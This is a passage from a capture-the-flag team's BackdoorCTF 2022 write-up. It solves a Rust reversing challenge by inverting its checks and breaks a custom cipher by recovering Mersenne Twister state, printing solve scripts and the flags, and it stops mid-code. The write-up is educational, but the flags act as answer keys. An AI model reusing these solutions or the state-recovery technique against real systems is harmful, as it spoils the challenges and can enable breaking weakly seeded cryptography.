      "@type": "ImageObject",
      "url": "https://b6a.black/favicon.ico"
    }
  }
}
</script>



</head>

<body class=" dark" id="top">
<noscript>
    <style type="text/css">
        .theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
            <span class="logo-switches">
                
                
            </span>
        </div>
        <ul id="menu" onscroll="menu_on_scroll()">
            <li>
                <a href="https://b6a.black/about-us/" title="About Us">
                    <span>About Us</span>
                </a>
            </li></ul>
    </nav>
</header>

    <main class="main">

<article class="post-single">
  <header class="post-header">

    <h1 class="post-title">
      BackdoorCTF 2022 Writeup
    </h1>
    <div class="post-meta">

December 24, 2022&nbsp;·&nbsp;botton, fsharp, harrier, LifeIsHard, J4cky, Ja5on, Mystiz, Viky

</div>
  </header>
  
  
  <div class="post-content js-toc-content">
<p>We played BackdoorCTF and we won the second place.</p>
<h2 id="reversing">Reversing<a hidden class="anchor" aria-hidden="true" href="#reversing">#</a></h2>
<h3 id="5p4gh3tt1-12-solves">5p4gh3tt1 (12 solves)<a hidden class="anchor" aria-hidden="true" href="#5p4gh3tt1-12-solves">#</a></h3>
<p><em>Solved by harrier and fsharp</em></p>
<p>We need to provide a recipe to the new spaghetti machine Sanji just bought. The recipe must satisfy several conditions which need to be reverse-engineered.</p>
<p>The binary given is a Rust program that checks whether a user-provided recipe is valid. After analyzing it in Ghidra, a namespace called <code>chall</code> could be found. Inside it, you could find several functions, one of which is the <code>main</code> function. Its logic is basically:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">print(<span style="color:#e6db74">&#34;Enter your great spaghetti recipe:&#34;</span>)
recipe <span style="color:#f92672">=</span> new_recipe()
<span style="color:#66d9ef">if</span> boiling_spaghetti(recipe) <span style="color:#f92672">and</span> chopping_veggies(recipe) <span style="color:#f92672">and</span> garnishing(recipe):
    print(<span style="color:#e6db74">&#34;It is indeed a great recipe!&#34;</span>)
<span style="color:#66d9ef">else</span>:
    print(<span style="color:#e6db74">&#34;You call this your great recipe? Disappointing.&#34;</span>)
</code></pre></div><h4 id="new_recipe">new_recipe()<a hidden class="anchor" aria-hidden="true" href="#new_recipe">#</a></h4>
<p>This is where the program receives user input. It also performs a length check which, if failed, would make the program exit early.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new_recipe</span>():
    recipe <span style="color:#f92672">=</span> input()
    <span style="color:#66d9ef">if</span> len(recipe) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">40</span>:
        print(<span style="color:#e6db74">&#34;Are you sure this is a spaghetti recipe?&#34;</span>)
        sys<span style="color:#f92672">.</span>exit()
    <span style="color:#66d9ef">return</span> recipe
</code></pre></div><p>So, our recipe needs to be exactly 40 characters long.</p>
<h4 id="part-1-boiling_spaghetti">Part 1: <code>boiling_spaghetti()</code><a hidden class="anchor" aria-hidden="true" href="#part-1-boiling_spaghetti">#</a></h4>
<p>From here onwards, 3 functions would be called, each of which would be called only if the function before it succeeded. Each function checks whether a specific part of the recipe is correct.</p>
<p><code>boiling_spaghetti()</code> turns each of the first 10 characters of the recipe into a value, which depends on the character position and value modulo 2. Afterwards, these values are checked against 10 hardcoded values.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_oil</span>(ingredient):
    <span style="color:#66d9ef">return</span> ((((ingredient <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x4f</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x44</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_pepper</span>(ingredient):
    <span style="color:#66d9ef">return</span> ((ingredient <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x38</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">5</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_salt</span>(ingredient):
    <span style="color:#66d9ef">return</span> ingredient <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_water</span>(ingredient):
    <span style="color:#66d9ef">return</span> (ingredient <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x58</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x4d</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">boiling_spaghetti</span>(recipe):
    vals <span style="color:#f92672">=</span> []
    encoded <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x1af</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x207</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0x167</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x13</span>]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
        ingredient <span style="color:#f92672">=</span> recipe[i]
        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">if</span> ingredient <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
                val <span style="color:#f92672">=</span> add_oil(add_water(ingredient))    <span style="color:#75715e"># 1st branch</span>
            <span style="color:#66d9ef">else</span>:
                val <span style="color:#f92672">=</span> add_water(add_salt(ingredient))   <span style="color:#75715e"># 2nd branch</span>
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">if</span> ingredient <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
                val <span style="color:#f92672">=</span> add_pepper(add_oil(ingredient))   <span style="color:#75715e"># 3rd branch</span>
            <span style="color:#66d9ef">else</span>:
                val <span style="color:#f92672">=</span> add_salt(add_oil(ingredient))     <span style="color:#75715e"># 4th branch</span>
        vals<span style="color:#f92672">.</span>append(val)
    <span style="color:#66d9ef">return</span> vals <span style="color:#f92672">==</span> encoded
</code></pre></div><p>We decided to bruteforce the possible characters for all branches for each value:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_oil_rev</span>(ingredient):
    <span style="color:#66d9ef">return</span> ((((ingredient <span style="color:#f92672">-</span> <span style="color:#ae81ff">9</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x44</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x4f</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_pepper_rev</span>(ingredient):
    <span style="color:#66d9ef">return</span> ((ingredient <span style="color:#f92672">^</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x38</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_salt_rev</span>(ingredient):
    <span style="color:#66d9ef">return</span> (ingredient <span style="color:#f92672">-</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_water_rev</span>(ingredient):
    <span style="color:#66d9ef">return</span> (ingredient <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x4d</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x58</span>

encoded <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x1af</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x207</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0x167</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x13</span>]

<span style="color:#66d9ef">for</span> ingredient <span style="color:#f92672">in</span> encoded:
    a <span style="color:#f92672">=</span> add_water_rev(add_oil_rev(ingredient))
    b <span style="color:#f92672">=</span> add_salt_rev(add_water_rev(ingredient))
    c <span style="color:#f92672">=</span> add_oil_rev(add_pepper_rev(ingredient))
    d <span style="color:#f92672">=</span> add_oil_rev(add_salt_rev(ingredient))
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&lt;=</span> a <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">126</span>:
        a <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&lt;=</span> b <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">126</span>:
        b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&lt;=</span> c <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">126</span>:
        c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&lt;=</span> d <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">126</span>:
        d <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39;</span><span style="color:#e6db74">{</span>chr(a)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">{</span>chr(b)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">{</span>chr(c)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">{</span>chr(d)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
</code></pre></div><p>The output is</p>
<pre tabindex="0"><code>'f', ''', ' ', 'v'
' ', ' ', 'l', ' '
' ', 'a', ' ', ' '
' ', ' ', ' ', 'g'
' ', '{', ' ', 'J'
'-', ' ', ' ', 'm'
' ', '3', ' ', ' '
' ', ' ', '4', 'p'
't', ' ', 'D', '|'
' ', ' ', 'b', ' '
</code></pre><p>For the 0th, 2nd, 4th, 6th and 8th rows, we consider the possible characters in the first two branches. For the other rows, we consider those in the remaining two branches.</p>
<p>Here, we guessed that the first part of the recipe is <code>flag{m34tb</code> since it&rsquo;s related to food. <code>m34tb</code> is &lsquo;meatb&rsquo; in leetspeak, which is likely to be the beginning of &lsquo;meatballs&rsquo;, and meatballs could be found in some spaghetti recipes.</p>
<h4 id="part-2-chopping_veggies">Part 2: <code>chopping_veggies()</code><a hidden class="anchor" aria-hidden="true" href="#part-2-chopping_veggies">#</a></h4>
<p>This is the most complicated part in our opinion. Some operations are done to determine the values of 3 variables, which depend on the first 10 characters of the recipe. These 3 variables would later be used to turn the 11th to 30th characters of the recipe into values that would be checked against 20 hardcoded values.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">chop_veggies</span>(veggie, quant):
    remainder <span style="color:#f92672">=</span> veggie <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>
    <span style="color:#66d9ef">if</span> remainder <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        <span style="color:#66d9ef">return</span> (veggie <span style="color:#f92672">*</span> quant) <span style="color:#f92672">^</span> quant
    <span style="color:#66d9ef">elif</span> remainder <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
        <span style="color:#66d9ef">return</span> (veggie <span style="color:#f92672">^</span> quant) <span style="color:#f92672">*</span> quant
    <span style="color:#66d9ef">return</span> (veggie <span style="color:#f92672">*</span> quant) <span style="color:#f92672">^</span> veggie

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">chopping_veggies</span>(recipe):
    vals <span style="color:#f92672">=</span> []
    encoded <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x28e00</span>, <span style="color:#ae81ff">0x9925</span>, <span style="color:#ae81ff">0x5a9e</span>, <span style="color:#ae81ff">0x4fb5</span>, <span style="color:#ae81ff">0x85a8</span>, <span style="color:#ae81ff">0xbcec</span>, <span style="color:#ae81ff">0xa56e</span>, <span style="color:#ae81ff">0x17b55</span>, <span style="color:#ae81ff">0x4f35</span>, <span style="color:#ae81ff">0x4fb5</span>, <span style="color:#ae81ff">0x18c41</span>, <span style="color:#ae81ff">0xbcec</span>, <span style="color:#ae81ff">0x2da80</span>, <span style="color:#ae81ff">0x92c0</span>, <span style="color:#ae81ff">0x2a74</span>, <span style="color:#ae81ff">0xae74</span>, <span style="color:#ae81ff">0xa3e0</span>, <span style="color:#ae81ff">0xc11a</span>, <span style="color:#ae81ff">0x8edf</span>, <span style="color:#ae81ff">0x1ec25</span>]
    <span style="color:#75715e"># &lt;complicated operations omitted&gt;</span>
    quant1 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">???</span>
    quant2 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">???</span>
    quant3 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">???</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">30</span>):
        veggie <span style="color:#f92672">=</span> recipe[i]
        remainder <span style="color:#f92672">=</span> (i <span style="color:#f92672">-</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>
        <span style="color:#66d9ef">if</span> remainder <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            val <span style="color:#f92672">=</span> chop_veggies(veggie, quant1)
        <span style="color:#66d9ef">elif</span> remainder <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
            val <span style="color:#f92672">=</span> chop_veggies(veggie, quant2)
        <span style="color:#66d9ef">else</span>:
            val <span style="color:#f92672">=</span> chop_veggies(veggie, quant3)
        vals<span style="color:#f92672">.</span>append(val)
    <span style="color:#66d9ef">return</span> vals <span style="color:#f92672">==</span> encoded
</code></pre></div><p>Dynamic analysis comes to the rescue. By entering <code>flag{m34tb</code> and 30 bytes of gibberish as the recipe, it is found that <code>quant1 = 384</code>, <code>quant2 = 361</code>, and <code>quant3 = 214</code>. Now it&rsquo;s possible to reverse the operations done on each hardcoded value:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">quant1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
quant2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">361</span>
quant3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">214</span>

part2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
encoded <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x28e00</span>, <span style="color:#ae81ff">0x9925</span>, <span style="color:#ae81ff">0x5a9e</span>, <span style="color:#ae81ff">0x4fb5</span>, <span style="color:#ae81ff">0x85a8</span>, <span style="color:#ae81ff">0xbcec</span>, <span style="color:#ae81ff">0xa56e</span>, <span style="color:#ae81ff">0x17b55</span>, <span style="color:#ae81ff">0x4f35</span>, <span style="color:#ae81ff">0x4fb5</span>, <span style="color:#ae81ff">0x18c41</span>, <span style="color:#ae81ff">0xbcec</span>, <span style="color:#ae81ff">0x2da80</span>, <span style="color:#ae81ff">0x92c0</span>, <span style="color:#ae81ff">0x2a74</span>, <span style="color:#ae81ff">0xae74</span>, <span style="color:#ae81ff">0xa3e0</span>, <span style="color:#ae81ff">0xc11a</span>, <span style="color:#ae81ff">0x8edf</span>, <span style="color:#ae81ff">0x1ec25</span>]

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(encoded)):
    val <span style="color:#f92672">=</span> encoded[i]
    remainder <span style="color:#f92672">=</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>
    <span style="color:#66d9ef">if</span> remainder <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        quant <span style="color:#f92672">=</span> quant1
    <span style="color:#66d9ef">elif</span> remainder <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
        quant <span style="color:#f92672">=</span> quant2
    <span style="color:#66d9ef">else</span>:
        quant <span style="color:#f92672">=</span> quant3
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">127</span>):
        <span style="color:#66d9ef">if</span> chop_veggies(c, quant) <span style="color:#f92672">==</span> val:
            part2 <span style="color:#f92672">+=</span> chr(c)
            <span style="color:#66d9ef">break</span>

print(part2)
</code></pre></div><p>The second part of the recipe is <code>4ll5_4nd_5p4gh3tt1_4</code>. So we were right about the meatballs after all!</p>
<h4 id="part-3-garnishing">Part 3: <code>garnishing()</code><a hidden class="anchor" aria-hidden="true" href="#part-3-garnishing">#</a></h4>
<p><code>garnishing()</code> checks the last 10 characters of the recipe. If any of the characters match 10 specific characters, they are mapped into one of 10 other characters. The string is then reversed and checked against a hardcoded string.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">garnishing</span>(recipe):
    vals <span style="color:#f92672">=</span> recipe[<span style="color:#ae81ff">30</span>:]
    encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%@!&amp;*/+#.)&#34;</span>
    trans <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;0&#39;</span>: <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>: <span style="color:#e6db74">&#39;*&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>: <span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>: <span style="color:#e6db74">&#39;)&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>: <span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;L&#39;</span>: <span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;H&#39;</span>: <span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>: <span style="color:#e6db74">&#39;#&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>: <span style="color:#e6db74">&#39;%&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>: <span style="color:#e6db74">&#39;!&#39;</span>}
    table <span style="color:#f92672">=</span> vals<span style="color:#f92672">.</span>maketrans(trans)
    vals <span style="color:#f92672">=</span> vals<span style="color:#f92672">.</span>translate(table)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
    <span style="color:#66d9ef">return</span> vals <span style="color:#f92672">==</span> encoded
</code></pre></div><p>Reverse the mappings as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">part3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%@!&amp;*/+#.)&#34;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
reverse_trans <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;/&#39;</span>: <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>: <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;&amp;&#39;</span>: <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;)&#39;</span>: <span style="color:#e6db74">&#39;5&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>: <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>: <span style="color:#e6db74">&#39;L&#39;</span>, <span style="color:#e6db74">&#39;@&#39;</span>: <span style="color:#e6db74">&#39;H&#39;</span>, <span style="color:#e6db74">&#39;#&#39;</span>: <span style="color:#e6db74">&#39;B&#39;</span>, <span style="color:#e6db74">&#39;%&#39;</span>: <span style="color:#e6db74">&#39;}&#39;</span>, <span style="color:#e6db74">&#39;!&#39;</span>: <span style="color:#e6db74">&#39;4&#39;</span>}

<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> encoded:
    part3 <span style="color:#f92672">+=</span> reverse_trans[c]

print(part3)
</code></pre></div><p>The third part of the recipe is <code>5ABL0234H}</code>.</p>
<p>Combining the three parts together, the recipe (i.e. the flag) is <code>flag{m34tb4ll5_4nd_5p4gh3tt1_45ABL0234H}</code>.</p>
<h2 id="crypto">Crypto<a hidden class="anchor" aria-hidden="true" href="#crypto">#</a></h2>
<h3 id="fishy-15-solves">Fishy (15 solves)<a hidden class="anchor" aria-hidden="true" href="#fishy-15-solves">#</a></h3>
<p><em>Solved by Mystiz and LifeIsHard</em></p>
<p>The original source code has a lot of redundant or over-complicated parts.
The charts below show briefly what the code did:</p>
<p><img src="/images/2022-12-24-backdoorctf/fishy-1.png" alt="">
<img src="/images/2022-12-24-backdoorctf/fishy-2.png" alt=""></p>
<p>From the source code, we can see that <code>random.getrandbits</code> is used for 256×4=1024 times to generate <code>s_boxes</code>.</p>
<p>Python uses <a href="https://en.wikipedia.org/wiki/Mersenne_Twister">MT19937</a> as its pseudorandom number generator. This generator is predictable as we can recover the state from 624 32-bits output. Therefore, we can first get the key by recovering the state, then reverse the enecryption steps.</p>
<h4 id="step-1-recover-key">Step 1: Recover key<a hidden class="anchor" aria-hidden="true" href="#step-1-recover-key">#</a></h4>
<p>We can use the code in this repo to recovering internal state from outputs.
<a href="https://github.com/twisteroidambassador/mt19937-reversible">https://github.com/twisteroidambassador/mt19937-reversible</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> mersenne_twister <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
<span style="color:#f92672">import</span> random

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recover_key</span>(output):
    
    stdlib_random <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>Random()
    mt <span style="color:#f92672">=</span> MT19937()

    output_for_cloning <span style="color:#f92672">=</span> list(chain<span style="color:#f92672">.</span>from_iterable(s_boxes))

    <span style="color:#75715e"># clone state with the first 624 32-bit random numbers</span>
    mt<span style="color:#f92672">.</span>clone_state_from_output(output_for_cloning[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">624</span>])

    <span style="color:#75715e"># check [624:] of s_boxes, confirm the state is recovered</span>
    generate_new <span style="color:#f92672">=</span> [mt<span style="color:#f92672">.</span>get_next_random() <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(len(output_for_cloning) <span style="color:#f92672">-</span> mt<span style="color:#f92672">.</span>n)]
    <span style="color:#66d9ef">assert</span> generate_new <span style="color:#f92672">==</span> output_for_cloning[<span style="color:#ae81ff">624</span>:]

    <span style="color:#75715e"># get the next 18 32-bit random numbers (which is the key)</span>
    key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([hex(mt<span style="color:#f92672">.</span>get_next_random())[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">18</span>)])

    <span style="color:#66d9ef">return</span> key

s_boxes <span style="color:#f92672">=</span> eval(open(<span style="color:#e6db74">&#39;s_boxes.txt&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip())
key <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(recover_key(s_boxes))
</code></pre></div><p>The key is <code>f25933f9b09571c39223c3040d5a43c1695417f8d94659b6f4fd7f8063fc3575d5ad46258df8d08c2916b3c5ed24d92b33bc1d2010959499312f94cc04139ea2727d0b08b03a71b1</code>.</p>
<p>We will convert the key to bytes for the next step.</p>
<h4 id="step-2-decrypt">Step 2: Decrypt<a hidden class="anchor" aria-hidden="true" href="#step-2-decrypt">#</a></h4>
<p>After we recovered the key, we can get <code>processed_sub_keys</code>. Then we can decrypt the ciphertext by reversing the steps in source code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long, long_to_bytes

modulus <span style="color:#f92672">=</span> pow(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">32</span>)
ct <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;f2b4b9be3b93cb2d8cc762bdf1d6cd57419d5c83d86c31faf9d2a39a829da4f7a831790ec17c1e7d0c7ae6615b6f5343478ccd9424a77e8aa66ef09233b0caee&#39;</span>)
initial_sub_keys <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;243f6a88&#39;</span>,<span style="color:#e6db74">&#39;85a308d3&#39;</span>,<span style="color:#e6db74">&#39;13198a2e&#39;</span>,<span style="color:#e6db74">&#39;03707344&#39;</span>,<span style="color:#e6db74">&#39;a4093822&#39;</span>,<span style="color:#e6db74">&#39;299f31d0&#39;</span>,<span style="color:#e6db74">&#39;082efa98&#39;</span>,<span style="color:#e6db74">&#39;ec4e6c89&#39;</span>,<span style="color:#e6db74">&#39;452821e6&#39;</span>,<span style="color:#e6db74">&#39;38d01377&#39;</span>,<span style="color:#e6db74">&#39;be5466cf&#39;</span>,<span style="color:#e6db74">&#39;34e90c6c&#39;</span>,<span style="color:#e6db74">&#39;c0ac29b7&#39;</span>,<span style="color:#e6db74">&#39;c97c50dd&#39;</span>,<span style="color:#e6db74">&#39;3f84d5b5&#39;</span>,<span style="color:#e6db74">&#39;b5470917&#39;</span>,<span style="color:#e6db74">&#39;9216d5d9&#39;</span>,<span style="color:#e6db74">&#39;8979fb1b&#39;</span>,]
key <span style="color:#f92672">=</span> [bytes_to_long(key[<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i:<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>]) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">18</span>)]
processed_sub_keys <span style="color:#f92672">=</span> [k<span style="color:#f92672">^</span>int(sub,<span style="color:#ae81ff">16</span>) <span style="color:#66d9ef">for</span> k,sub <span style="color:#f92672">in</span> zip(key, initial_sub_keys)]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(processed_sub_keys, s_boxes, ct):
    m <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
    
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ct), <span style="color:#ae81ff">8</span>):
        xl, xr <span style="color:#f92672">=</span> bytes_to_long(ct[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>]), bytes_to_long(ct[i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>])
        xl, xr <span style="color:#f92672">=</span> xr <span style="color:#f92672">^</span> processed_sub_keys[<span style="color:#ae81ff">16</span>], xl <span style="color:#f92672">^</span> processed_sub_keys[<span style="color:#ae81ff">17</span>]
        
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">15</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
            new_xl, new_xr <span style="color:#f92672">=</span> xl, xr
            
